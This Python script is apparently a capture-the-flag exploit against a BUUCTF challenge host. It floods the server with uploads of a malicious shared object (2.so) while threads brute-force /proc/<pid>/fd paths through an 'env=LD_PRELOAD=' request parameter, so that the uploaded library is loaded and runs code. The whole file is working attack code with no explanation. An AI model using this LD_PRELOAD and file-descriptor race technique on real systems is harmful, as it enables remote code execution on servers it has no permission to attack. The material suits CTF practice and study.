import _thread
import time
import requests
 
url = "http://72b6e91d-e9d9-4728-b320-84232d5d4904.node5.buuoj.cn:81/"
def tr1():
   while 1:
      files = open("2.so", 'rb')
 
      r=requests.post(url, data=files)
      if '429' in r.text:
          time.sleep(1)
def tr2(pid):
    while 1:
        for i in range(1,30):
            response = requests.get(url+"/index.php?env=LD_PRELOAD=/proc/{}/fd/../../{}/fd/{}".format(pid,pid,i))
            if '429' in response.text:
                time.sleep(1)
            print(str(i)+" Response body: %s" % response.content)
       # time.sleep(2)
    
def tr3():
    for i in range(1,20):
        _thread.start_new_thread( tr2,(i,))
 
try:
   _thread.start_new_thread( tr1,())
   _thread.start_new_thread(tr3, ())
except:
   print("Error: 无法启动线程")
 
while 1:
   pass